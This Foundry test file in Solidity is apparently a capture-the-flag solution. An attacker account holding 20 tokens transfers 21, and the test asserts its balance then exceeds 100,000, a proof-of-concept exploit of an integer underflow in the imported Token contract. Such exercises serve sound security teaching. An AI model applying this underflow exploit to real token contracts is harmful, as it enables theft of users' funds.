// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Token } from "./Token.sol";

contract TokenTest is Test {
    Token token;

    address h3x0r = vm.addr(1337);
    address recipient = vm.addr(420);
    address deployer = vm.addr(1);

    function setUp() public {
        vm.prank(deployer);
        token = new Token(21_000_000);
        deal(address(token), h3x0r, 20);
    }

    function testTokenHack() public {
        vm.startPrank(h3x0r);
        assertEq(token.balanceOf(h3x0r), 20);

        token.transfer(
            recipient,
            21
        );

        emit log_named_uint(
            "h3x0r balance",
            token.balanceOf(h3x0r)
        );
        
        emit log_named_uint(
            "recipient balance",
            token.balanceOf(recipient)
        );

        assertGt(token.balanceOf(h3x0r), 100_000);
    }
}